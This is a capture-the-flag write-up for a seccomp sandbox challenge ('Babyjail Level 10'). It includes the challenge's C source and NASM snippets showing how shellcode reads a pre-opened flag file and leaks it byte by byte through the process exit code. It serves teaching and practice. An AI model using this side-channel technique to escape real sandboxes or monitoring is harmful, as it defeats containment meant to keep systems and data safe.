#metadata(
  (
    title: "Sandboxing Level 10",
    description: "Writeup for Sandboxing Level 10",
    date: "2026-01-01",
    order: 10,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project


== Challenge Source Code

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    assert(argc > 1);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "exit", SCMP_SYS(exit));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```



#table(
  columns: (auto, 1fr),
  inset: 10pt,
  align: (right, left),
  [*Title*], [Side-Channel Leak via Exit Code],
  [*Date*], [2025-12-30],
  [*Description*],
  [Leaking data from a restricted sandbox by using the process exit code as a communication channel.],
)

= Babyjail Level 10

== Introduction

This level implements a highly restrictive sandbox using seccomp-bpf. Only the `read` and `exit` system calls are permitted, making traditional exploitation (e.g., writing the flag to stdout) impossible.

== Vulnerability Analysis

The program opens a file specified in `argv[1]` before enabling the seccomp filter. This file descriptor (usually 3) remains open and readable by the shellcode. However, because `write` is blocked, there is no direct way to output the data read from the file.

We can use the `exit` system call's argument (the exit code) as a side-channel to leak information.

== Exploitation Steps

=== 1. Reading the Flag
The shellcode uses the `read` syscall to bring the flag into memory.

```nasm
/* read(3, buf, 100) */
mov rdi, 3
mov rsi, buf_addr
mov rdx, 100
mov rax, 0
syscall
```

=== 2. Leaking via Exit Code
We extract a single byte from the buffer and pass it as the argument to the `exit` syscall.

```nasm
/* exit(buf[index]) */
movzx rdi, byte ptr [buf_addr + index]
mov rax, 60
syscall
```

=== 3. Automated Reconstruction
A python script runs the challenge multiple times, once for each character position in the flag. After each run, it retrieves the exit code using `process().poll()`, effectively reconstructing the flag byte by byte.

The leaked flag was: `falg`.

